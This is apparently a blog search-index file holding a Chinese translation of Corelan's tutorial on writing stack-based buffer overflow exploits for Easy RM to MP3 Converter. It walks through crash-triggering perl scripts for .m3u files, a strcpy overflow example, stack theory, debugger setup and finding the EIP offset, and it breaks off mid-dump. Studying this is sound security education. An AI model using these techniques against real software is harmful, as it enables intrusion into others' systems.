<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Exploit编写教程第一部分：基于栈的溢出]]></title>
      <url>/2019/08/02/Exploit%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
      <content type="html"><![CDATA[<blockquote>
<p>Url: <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a></p>
</blockquote>
<blockquote>
<p>Author: <a href="https://www.corelan.be/index.php/author/admin1/" target="_blank" rel="noopener">Corelan Team (corelanc0d3r)</a></p>
</blockquote>
<blockquote>
<p>Translator: B1ngDa0(captainguy#forxmail.com)</p>
</blockquote>
<hr>
<p>&emsp;&emsp;大家好，我是B1ngDa0，这次为大家带来Exploit编写的教程，没错，我来开坑了，还是俩坑。我也是边翻译边跟着学习，内容篇幅较长，难免出现纰漏。如有任何不对的地方请指出。也欢迎私信、邮件交流学习。本教程虽是比较久远的，但还是有很多值得学习的地方，如若想更方便的跟着练习可以观看我的小教程《跟着靶机Writeup学BOF》，通过HackTheBox的靶机实战学习BOF（如果你还未在本文没看到相关链接，说明这只是一个预告，慢慢填坑中/(ㄒoㄒ)/~~）。</p>
<hr>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>&emsp;&emsp;上周五的时候（2009年7月17日），叫“Crazy_Hacker”（昵称）的一个人在 packetstormsecurity.org 上提交了一个<a href="http://www.rm-to-mp3.net/download.html" target="_blank" rel="noopener">Easy RM to MP3 Conversion Utility</a>（Windows XP SP2 英文版）的漏洞。（<a href="https://packetstormsecurity.com/0907-exploits/）。这份漏洞报告包含一个" target="_blank" rel="noopener">https://packetstormsecurity.com/0907-exploits/）。这份漏洞报告包含一个</a> POC（顺带一提，在我的 XP SP3 英文版中不起作用）。<a href="http://www.milw0rm.com/exploits/9186" target="_blank" rel="noopener">另一个漏洞</a>的发布也随即而来。</p>
<p>&emsp;&emsp;很棒。现在你可以复制 POC 利用代码，运行它，发现它不起作用（或者如果你很幸运，可以认为它有效），或者…你可以尝试理解构建 Exploit 的过程，以便修正失败的 Exploit，或者从头开始构建你自己的Exploit。</p>
<p>&emsp;&emsp;（顺便一提：除非你能够反编译，快速阅读并且理解 shellcode，我永远不建议你只是获取（特别是它只是一个预编译的可执行文件）然后执行 Exploit），要是它只是在你的电脑中创建一个后门呢？</p>
<p>&emsp;&emsp;问题是：Exploit 作者怎样构建他们的 exploits？从发现一个可能的问题到构建一个实际可用的 exploit 的过程是怎样的？如何使用漏洞信息来构建自己的 exploit？</p>
<p>&emsp;&emsp;自从我开始写这个博客，写一个关于编写缓冲溢出的基础教程一直在我的“待做“列表中…但是我从未真正花时间去那样做（或者只是简单的忘了）。</p>
<p>&emsp;&emsp;当我今天看到这个漏洞，并且仔细的看了看，我认为这个漏洞报告能够成为编写 exploits 的一个完美例子…它是清楚的、简单的并且能让我演示一些用于编写有效并稳定的基于栈溢出的技巧。</p>
<p>&emsp;&emsp;所以这可能是一个好的时机… 尽管考虑到上述的漏洞报告已经包含一个 exploit（有效与否），我将仍然使用“Easy RM to MP3 conversion utility”的漏洞举例并且我们将完成编写一个有效的 exploit 的所有步骤，不从原始 exploit 复制任何内容。我们将从头开始构建（并且这次让它在 XP SP3 中生效）。</p>
<p>&emsp;&emsp;在我们继续之前，让我有话直说。这份文档纯粹是为了教学。我不想任何人使用这些信息（或者任何这个博客中的信息）去实际入侵电脑或其他违法的事情。因此，我不能对获取这份文档并将其用于违法上的人的行为负责。如果你不同意，那么你就不能继续的访问这个网站…所以马上离开这个网站。</p>
<p>&emsp;&emsp;不管怎样，有说过，你从漏洞报告中获取的信息通常包含这个漏洞的基本信息。在这样的情况下，漏洞报告指出“Easy RM to MP3 converter 2.7.3.700版本通用缓冲溢出通过创建了一个恶意的 .m3u 文件利用”。换句话说，你可以创建一个恶意的 .m3u 文件，将其输入 utility 并触发漏洞。报告可能不会每次都很具体，但是大多数情况下你会知道怎么模拟崩溃或者让应用程序的行为变得怪异。若非如此的话，那么安全研究员可能首先要向供应商披露他/她的发现，给供应商机会来解决问题… 或者只是向为他/她自己保留情报。</p>
<blockquote>
<p>“在开始一系列关于 exploit 编写教程（但愿如此）的第一部分之前，允许我提及我建立的可以讨论 exploit 编写的议题/提问/建议/技巧等等的论坛（会员可见）。你可以通过 <strong><a href="https://www.corelan.be//index.php/forum/writing-exploits/" target="_blank" rel="noopener">https://www.corelan.be//index.php/forum/writing-exploits/</a></strong>访问论坛。（论坛已被关闭）</p>
</blockquote>
<hr>
<h3 id="验证-bug"><a href="#验证-bug" class="headerlink" title="验证 bug"></a>验证 bug</h3><p>&emsp;&emsp;首先，让我们确认这个程序在打开一个 的 .m3u 文件时的确会崩溃。（或者你自己找一个当你输入精心设计过的数据会使它崩溃的程序）</p>
<p>&emsp;&emsp;找到一个 Easy RM to MP3 的有漏洞版本的拷贝，然后安装到 Windows XP 的电脑上。这个漏洞报告显示这个 exploit 在 XP SP2（英文）有效，但是我将使用 XP SP3（英文）。</p>
<p>&emsp;&emsp;有漏洞的程序的本地拷贝可在此下载：</p>
<p>&emsp;&emsp;<a href="https://download.csdn.net/download/goudaner01/8495675" target="_blank" rel="noopener">https://download.csdn.net/download/goudaner01/8495675</a></p>
<p><img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb4.png" alt></p>
<p>&emsp;&emsp;快速旁注：你可以发现在 oldapps.com 和 oldversion.com 发现老程序的版本，或者在 exploit-db.com 寻找 exploits。（经常有一个有漏洞的程序的本地拷贝）</p>
<p>&emsp;&emsp;我们将使用下面简单的 perl 脚本来创建一个可能帮助我们发现更多关于漏洞的信息的 .m3u文件。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"crash.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"\x41"</span> <span class="keyword">x</span> <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE <span class="string">"$junk"</span>;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;运行这个脚本来创建 .m3u文件。这个文件将会被 10000个A填满（\x41 是A的十六进制格式）然后使用 Easy RM to MP3 打开这个 .m3u文件。应用抛出一个错误，但是看起来错误得到了正确的处理，程序没有崩溃。修改脚本来创建一个包含 20000个A的程序然后再次尝试。一样的结果（正确处理异常，所有我们仍然不能覆盖任何有用的东西）。现在改变脚本来写入 3000个A 然后使用 utility 打开它。</p>
<p>&emsp;&emsp;成功 - 程序崩溃。</p>
<p>&emsp;&emsp;好的，如果我们输入一个包含 20000 到 30000 个 A 的文件，应用程序就会崩溃，但是我们该怎么做呢？</p>
<hr>
<h3 id="验证-Bug-看它是否会变得有趣"><a href="#验证-Bug-看它是否会变得有趣" class="headerlink" title="验证 Bug - 看它是否会变得有趣"></a>验证 Bug - 看它是否会变得有趣</h3><p>&emsp;&emsp;显然地，不是程序的每个崩溃都会导致 exploit。在多数情况，程序崩溃不会导致 exploit，但是有时候会。使用“exploit”，我的意思是你想让程序做一些它不打算做的事情，比如运行你自己的代码。使程序做一些不同的事情的最简单方法是控制程序流（然后把它重定向到其他地方）。可以通过控制 Instruction Pointer（或者 Program Counter） 来完成，它是一个包含位于需要执行的下一条指令的指针的 CPU 寄存器。</p>
<p>&emsp;&emsp;假设程序调用带有参数的函数。在进入该函数之前，它将在指令指针中保存当前位置（因此，当函数完成时，它知道返回到哪里）。如果你可以这个指针的值，然后将它指向在内存中包含一段你自己的代码的位置，然后你可以改变程序流然后使它执行一些不一样的事（除了回到初始的位置）。在控制程序流之后的你想执行的代码通常被称为“shellcode”。所以如果我们让程序运行我们的 shellcode，我们可以叫它一个有效的 exploit。在大多数情况，这个指针由术语 EIP 引用。这个寄存器的大小是 4字节。所以如果你能够修改这4个字节，那么你就拥有了这个程序（以及运行这个程序的电脑）。</p>
<hr>
<h3 id="在我们继续之前-一些理论"><a href="#在我们继续之前-一些理论" class="headerlink" title="在我们继续之前 - 一些理论"></a>在我们继续之前 - 一些理论</h3><p>&emsp;&emsp;你只需要知道几个术语：</p>
<p>&emsp;&emsp;每个 Windows 应用程序都使用部分内存。进程内存包含 3个主要组件：</p>
<ul>
<li><p>代码段（处理器执行指令。EIP 跟踪下一条指令</p>
</li>
<li><p>数据段（变量，动态缓冲区）</p>
</li>
<li><p>栈段（常用于传递数据/参数至函数，也被用于变量的空间），栈从记录的虚拟内存的末端开始（栈底部）向下增长（到较低的地址）。PUSH 向栈顶端添加了一些东西，POP 将从栈中删除一个条目（4字节）并将其放入寄存器中。</p>
<p>如果你向直接访问栈内存，你可以使用 ESP（栈指针），它可以指出栈的顶端（也有最低的地址）。</p>
</li>
<li><p>在一次 PUSH 之后，ESP 将指出一个更低的内存地址（地址会随着推送到栈上的数据的大小而递减，对于地址/指针，它是四个字节）。递减通常发生在项目被放置到栈之前（取决于执行，如果 ESP 已经指向栈中的下一个空闲位置，递减将会在数据被放在栈后发生）。</p>
</li>
<li><p>在一次 POP 后，ESP 指向一个更高的地址（地址是递增的（地址/指针按 4字节计算））。递减将会在数据被从栈中移除后发生。</p>
</li>
</ul>
<p>&emsp;&emsp;当进入一个函数/子程序后，一个栈帧被创建。这个帧将父程序的参数存放在一起，并被用来将参数传递给子程序。栈的当前位置可以通过栈指针（ESP）访问，函数当前的基址被包含于基址指针（EBP）（帧指针）。</p>
<p>&emsp;&emsp;CPU 通用内存寄存器（Inter，x86）为；</p>
<ul>
<li>EAX：累加器：用于演示计算。用于存储函数调用的返回值。如加法、减法的基本的操作一般使用这个通用寄存器</li>
<li>EBX：基址（没有任何内容在基址指针上）。它没有一般用途，可以存储数据。</li>
<li>ECX：计数器：用于迭代。ECX 向下数</li>
<li>EDX：数据：这是 EAX 寄存器的一个拓展。它允许额外的数据被存储帮助作一些更复杂的计算（乘法）</li>
<li>ESP：栈指针</li>
<li>EBP：基址指针</li>
<li>ESI：资源索引：保存输入数据的位置</li>
<li>EDI：目的变址寄存器：存储数据操作结果的位置</li>
<li>EIP：指令指针</li>
</ul>
<hr>
<h3 id="内存进程"><a href="#内存进程" class="headerlink" title="内存进程"></a>内存进程</h3><p>&emsp;&emsp;当一个程序在 Win32 环境中启动时，一个进程被创建并被分配虚拟内存。在 32位进程中，地址的范围是从 0x00000000 到 0xFFFFFFFF，0x0000000 到 0x7FFFFFFF 被分配给“用户空间”，0x80000000 到 0xFFFFFFFF 被分配给“内核空间”。Windows使用<a href="http://en.wikipedia.org/wiki/Flat_memory_model" target="_blank" rel="noopener">平面存储模式</a>，这意味着 CPU 可以 直接地/循序地/线性地寻址所有可用的内存地址，而不需要使用分段/分页方案。</p>
<p>&emsp;&emsp;内核空间只允许操作系统访问。</p>
<p>&emsp;&emsp;当一个进程被创建，PEB（Process Execution Block 流程执行块）和 TEB（Thread Environment Block 线程环境块）被创建。</p>
<p>&emsp;&emsp;PEB 包含所有用户空间的与当前进程有关联的进程：</p>
<ul>
<li>主要的执行文件的位置</li>
<li>指向加载程序数据的指针（可用于列出/可加载到进程中的所有的 dll 模块）</li>
<li>指向有关堆的信息的指针</li>
</ul>
<p>&emsp;&emsp;TEB 描述并包括线程的状态</p>
<ul>
<li>PEB 在内存中的位置</li>
<li>栈所属线程的位置</li>
<li>指向 SEH 链中的第一个进入的条目的指针（有关 SEH 链的更多信息请参阅教程3和3b）</li>
</ul>
<p>&emsp;&emsp;进程中的每个线程都一个 TEB。</p>
<p>&emsp;&emsp;Win32 的进程内存映射是这样的：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2010/08/image_thumb3.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;程序的 image / dll 的文本段是只读的，因为它只包含程序的代码。这可以防止人们修改程序代码。内存段具有固定大小。数据段用于存储全局和静态程序变量，并且用于初始化全局变量、字符串、和其他常量。</p>
<p>&emsp;&emsp;数据段是可写的并且具有固定的大小。堆段用于其他的程序变量，它可以根据需要变大或变小。堆中的所有内存都由 allocator（分配器）（和 释放函数）的算法挂你。这些算法保留了一个内存区域。堆将朝着更高的地址增长。</p>
<p>&emsp;&emsp;在 dll 中，代码，导入（dll 使用的函数列表，来自另一个 dll 或程序），和导出（使用其他 dll 的程序的可用函数）是 .text 的一部分。</p>
<hr>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>&emsp;&emsp;<a href="http://en.wikipedia.org/wiki/Stack-based_memory_allocation" target="_blank" rel="noopener">栈</a>是内存进程的一部分，是一种按照后进先出工作的数据结构。操作系统为每个线程（在创建线程时）分配栈。当线程结束，栈也随之被清除。栈的大小在它被创建时确定并不再改变。结合后进先出和栈不需要复杂的管理结构/机制来管理来看，栈是特别快的，但是大小受限。</p>
<p>&emsp;&emsp;后进先出意味着最近放置的数据（ PUSH 指令的结果）是将第一个将被从栈中删除的数据（通过 POP 指令）。</p>
<p>&emsp;&emsp;当栈被创建，栈指针指向栈的顶部（=栈上的最高地址）。随着信息被推到栈中，栈指针递减（去一个较低的地址）。 所以本质上，栈向更低的地址增长。</p>
<p>&emsp;&emsp;栈包含本地变量、函数调用和其他一些不需要长时间存储的数据。随着栈中增加更多的数据（推送到栈中），栈指针开始递减并且栈向更低的地址增长。</p>
<p>&emsp;&emsp;每次函数被调用的时候，函数参数以及寄存器（EBP、EIP）的保存值将被推入栈中。当函数返回时，从栈中检索保存的EIP值并将其放回EIP中，这样就可以恢复正常的程序流。</p>
<p>&emsp;&emsp;让我们使用下面几段简单的代码来演示这个行为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_something</span><span class="params">(<span class="keyword">char</span> *Buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> MyVar[<span class="number">128</span>];</span><br><span class="line">     <span class="built_in">strcpy</span>(MyVar,Buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     do_something(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;(你可以编译这段代码。复制一份 Dev-C++ 4.9.9.2，创建一个 Win32控制台项目（使用 C语言，不是 C++），复制这段代码并且编译)。在我的系统上，我命名这个项目为“stacktest”。运行这个程序：“stacktest.exe AAAA”。应该不会返回结果。</p>
<p>&emsp;&emsp;这个程序接收一个参数（ arg[1] ）并且将这个参数传递给函数 do_something()。在这个函数中，参数被复制进一个最大值为 128字节的本地变量。所以如果参数大于 127字节（+ 一个终止字符串的空字节），缓冲区可能会溢出。</p>
<p>&emsp;&emsp;当函数“do_something(parame1)”被从 main()内部调用时，会发生以下事情：</p>
<p>&emsp;&emsp;一个新的栈帧在`父`栈的顶部被创建，栈指针（ESP）指向新创建的栈的最高地址。这是栈的顶部</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb19.png" alt="image"></p>
<p>&emsp;&emsp;在 do_something() 被调用之前，一个指向参数的指针被推至栈。在我们的案例中，这是一个指向 argv[1] 的指针。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb26.png" alt="image"></p>
<p>&emsp;&emsp;执行 MOV指令之后的栈：</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb27.png" alt="image"></p>
<p>&emsp;&emsp;接下来，调用函数do_something。CALL 指令首先将当前指针放到栈中（这样，如果函数结束，它就知道返回到哪里），然后跳转到函数上。</p>
<p>&emsp;&emsp;执行 CALL 指令后的栈：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb28.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;由于 PUSH，ESP 减少了4字节并且现在指向更低的地址。</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb20.png" alt="image" title class>
                <p>image</p>
            </figure>





<p>&emsp;&emsp;（或者，在调试器中也可以看到）：</p>
<p>&emsp;&emsp;ESP 指向 0022FF5C。在这个地址中，我们可以看到存储的 EIP（Return to……），接下来是一个指向参数的指针（在这个例子中是 AAAA）。指针在指向 CALL 指令前被存储在栈中。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2011/12/image_thumb.png" alt="image"></p>
<p>&emsp;&emsp;接下来，执行 prolog 函数。这基本上将帧指针（EBP）保存到栈中，因此当函数返回时也可以恢复它。保存帧指针的指令是“push ebp”。ESP再次减少4个字节。</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb22.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;在 push ebp 之后，将当前栈指针（ESP）放入 ebp中。此时，ESP 和 EBP 都位于当前栈的顶部。这样程序可以使用 EBP 的偏移量应用变量</p>
<blockquote>
<p>大多数函数都是以这个顺序开始：PUSH EBP，然后是 MOV EBP，ESP</p>
</blockquote>
<p>&emsp;&emsp;因此，如果将 4个字节推入栈，ESP 将减少4个字节，EBP仍将保持原样。然后可以使用 EBP-0x4这 4个字节。</p>
<p>&emsp;&emsp;接下来，我们可以看到变量 MyVar（128字节）的栈空间是如何声明/分配的。为了保存数据，栈上分配了一些空间来保存这个变量中的数据，这个字节数很可能超过128个字节，因为编译器决定了一个分配例程。对于 Dev-C++。这是 0x98字节。所以你将看到一个 SUB ESP 0x98指令。这样，这个变量就有空间了。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb23.png" alt="image"></p>
<p>&emsp;&emsp;分解的函数是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00401290  /$ 55             PUSH EBP</span><br><span class="line">00401291  |. 89E5           MOV EBP,ESP</span><br><span class="line">00401293  |. 81EC 98000000  SUB ESP,98</span><br><span class="line">00401299  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |</span><br><span class="line">0040129C  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |</span><br><span class="line">004012A0  |. 8D85 78FFFFFF  LEA EAX,DWORD PTR SS:[EBP-88]            ; |</span><br><span class="line">004012A6  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |</span><br><span class="line">004012A9  |. E8 72050000    CALL                 ; \strcpy</span><br><span class="line">004012AE  |. C9             LEAVE</span><br><span class="line">004012AF  \. C3             RETN</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;（不要担心这些代码。你可以清楚的看到函数 prolog（EBP 和MOV EBP,ESP），你也可以看到分配空间给 MyVar（SUB ESP,98），并且你可以看到一些 MOV 和 LEA 指令（基本上设置了 strcpy 函数的参数，使用 位于argv[1] 的指针复制数据到 MyVar中）。</p>
<p>&emsp;&emsp;如果这个函数中没有 strcpy()，那么这个函数将结束并“展开”栈。基本上，它只是将 ESP 移回到保存 EIP 的位置，然后发出 RET 指令。在本例中， ret 将从栈中获取保存的 EIP 指针并跳转到它（因此，它将在do_something()被调用之后返回主函数）。 epilog 指令由一条 LEAVE 指令执行（它将同时恢复 帧指针 和 EIP ）。</p>
<p>&emsp;&emsp;在我的例子中，我们有 strcpy() 函数。</p>
<p>&emsp;&emsp;这个函数将从 [buffer] 指向的地址读取数据，并将数据存储在其中，读取所有数据知道看到一个空字节（字符串终止符）。当它复制数据时，ESP 会保持原样。strcpy() 不通过使用 PUSH 指令将数据放到栈上，它基本上读取一个字节然后使用索引（例如ESP，ESP+1，ESP+2等等）将其写入栈中。复制之后，ESP仍然指向字符串的开头。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png" alt="image"></p>
<p>&emsp;&emsp;这意味着如果 [Buffer] 中的数据比 0x98 字节长一些，strcpy()将覆盖保存 EBP 并最终保存 EIP（以此类推）。毕竟它只是继续读和写，直到到达源位置中的空字节（字符串的情况）。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2010/09/image_thumb25.png" alt="image"></p>
<p>&emsp;&emsp;ESP 仍然指向字符串的开头。strcpy()完成时就好像没有任何问题一样。在 strcpy()之后，函数结束。这就是有趣的地方。函数 epilog 开始工作。基本上，它将把 ESP 移回到保存 EIP 的位置，并发出 RET 指令，它将接收指针（在我们的例子中是 AAAA 或 0x41414141，因为它被覆盖了），并跳转到那个地址。</p>
<p>&emsp;&emsp;所以你控制了 EIP。</p>
<p>&emsp;&emsp;长话短说，通过控制 EIP，你基本上可以更改函数将使用的返回地址，以便“恢复正常流”。</p>
<p>&emsp;&emsp;当然，如果你通过发出缓冲区溢出来更改这个返回地址，它就不再是“正常流”了。</p>
<p>&emsp;&emsp;假设你可以在 MyVar、EBP、EIP中覆盖缓冲区，并且在保存的 EIP 的前后有 A（你自己的代码）。在发送缓冲区（[MyVar][EBP][EIP][你自己的代码]）之后，ESP 将/应该指向[你的代码]的开头，所以如果你能让 EIP 进入你的代码，那么你就可以控制了。</p>
<blockquote>
<p>提示：当栈上的缓冲区溢出时，使用术语“基于栈的溢出”或“栈缓冲区溢出”。当你试图写入超过栈帧末尾的内容时，使用术语“栈溢出”。不要把这两者混淆起来，因为它们是完全不同的。</p>
</blockquote>
<hr>
<h3 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h3><p>&emsp;&emsp;为了查看栈的状态（以及寄存器的值如指令指针、栈指针等），我们需要将调试器连接到程序，这样我们就可以看到在程序运行时发生了什么（特别是程序死亡时）。</p>
<p>&emsp;&emsp;有许多调试器可以用于此目的。我最常用的两个调试器是 Windbg 和 Immunity’s Debugger</p>
<p>&emsp;&emsp;让我们使用 Windbg。安装 Windbg（完整安装）并且使用“windbg -I”将其注册为“post-mortem”。</p>
<p><img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb5.png" alt="image"></p>
<p><img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb6.png" alt="image"></p>
<p>&emsp;&emsp;你可以通过禁止下方的注册表来关闭弹出框“xxx 遇到了一个问题并且需要关闭”：</p>
<p>&emsp;&emsp;HKLM\Software\Microsoft\Windows NT\CurrentVersion\AeDebug\Auto : 设置为0</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb7.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;为了避免 Windbg 提示找不到 sybmol文件，在硬盘上创建一个文件夹（比如c:\windbgsymbols）。然后在 Windbg 中，进入 “File”-“Sybmol File Paht”，输入以下字符串：</p>
<blockquote>
<p>SRV<em>C:\windbgsymbols</em><a href="http://msdl.microsoft.com/download/symbols" target="_blank" rel="noopener">http://msdl.microsoft.com/download/symbols</a></p>
</blockquote>
<p>&emsp;&emsp;（不要在字符串后面输入一个空行，确保这串字符串是 sybmol 路径区域唯一的字符串）</p>
<p>&emsp;如果你想使用 Immunity Debugger:在这里<a href="http://debugger.immunityinc.com/register.html" target="_blank" rel="noopener">下载</a>并且安装。打开 Immunity Debugger，进入“Options”-“Just in-time debugging” 然后点击“Make Immunity Debugger just in-time debugger”。</p>
<p>&emsp;&emsp;好了让我们开始。</p>
<p>&emsp;&emsp;启动 Easy RM to MP3，然后再次打开 crash.m3u 文件。程序将会再次崩溃。如果你禁止了弹出窗口，Windbg 或 Immunity Debugger将会自动启动。如果你看到一个弹窗窗口，点击“debug”按钮然后 debugger 将会自动启动：</p>
<p>Windbg：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image50_thumb.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>Immunity：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2010/08/image_thumb11.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;这个界面显示了相同的信息，但是是一个更图形化的方式。左上角是 CPU 视图，它显示了指令的集合以及其操作码。（该窗口是空的，因为当前 EIP  指向 41414141，这不是一个有效的地址）。在右上角的窗口中，你可以看到寄存器。在左下角，你可以看到本例中的内容转储为00446000。在右下角，你可以看到栈的内容（即 ESP 指向的位置的内存内容）。</p>
<p>&emsp;&emsp;不管怎样，看起来我们的 m3u文件的一部分被读入了缓冲区，导致缓冲区溢出。我们已经能够溢出缓冲区并跨指令指针写入。所以我们可以控制 EIP 的值。</p>
<p>&emsp;&emsp;由于我们的文件只包含 A，我们不知道我们的缓冲区需要多大才能准确地写入 EIP。换句话说，如果我们想要覆盖 EIP（因此我们可以给它提供可用的数据并使它跳到我们的恶意代码，我们需要知道我们的缓冲区/Payload 中的准确位置），我们覆盖返回地址（当函数返回时，它将成为 EIP）。这个位置经常被称为“偏移（offset）”。</p>
<hr>
<h3 id="确定缓冲区大小，准确写入-EIP"><a href="#确定缓冲区大小，准确写入-EIP" class="headerlink" title="确定缓冲区大小，准确写入 EIP"></a>确定缓冲区大小，准确写入 EIP</h3><p>&emsp;&emsp;我们知道 EIP 位于缓冲区开始初的20000到30000字节之间。现在你可以使用想要覆盖 EIP 的地址覆盖 20000到 30000 之间的所有内存空间。这可能行得通，但是如果你能够找到执行覆盖的确切位置，那么看起来会好得多。 为了确定缓冲区中 EIP 的确切偏移量，我们需要做一些额外的工作。</p>
<p>&emsp;&emsp;首先，让我们尝试通过修改 perl 脚本来缩小位置：</p>
<p>&emsp;&emsp;让我们对分法。我们将创建一个包含 25000个 A 和 5000个 B 的文件。如果 EIP 包含 41414141（AAAA），则 EIP 位于 20000到 25000之间，如果 EIP 包含 42424242（BBBB），则 EIP 位于 25000到 30000 之间。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"crash25000.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk = <span class="string">"\x41"</span> <span class="keyword">x</span> <span class="number">25000</span>;</span><br><span class="line"><span class="keyword">my</span> $junk2 = <span class="string">"\x42"</span> <span class="keyword">x</span> <span class="number">5000</span>;</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$junk2;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;创建这个文件并且在 Easy RM to MP3 中打开 crash25000.m3u</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image58_thumb.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;好了， EIP 包含 42424242（BBBB），所以我们知道 EIP 的偏移量在 25000 到 30000 之间。这也意味着我们应该/可能在内存中看到位于 ESP 的剩余的 B（假定 EIP 在 30000字符缓冲区结束之前被覆盖）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Buffer :</span><br><span class="line">                       [       5000 B&apos;s                   ]</span><br><span class="line">[AAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB][BBBB][BBBBBBBBB......]</span><br><span class="line">     25000 A&apos;s                        EIP  ESP points here</span><br></pre></td></tr></table></figure>

<p>dump ESP 的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; d esp</span><br><span class="line">000ff730  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff740  42 42 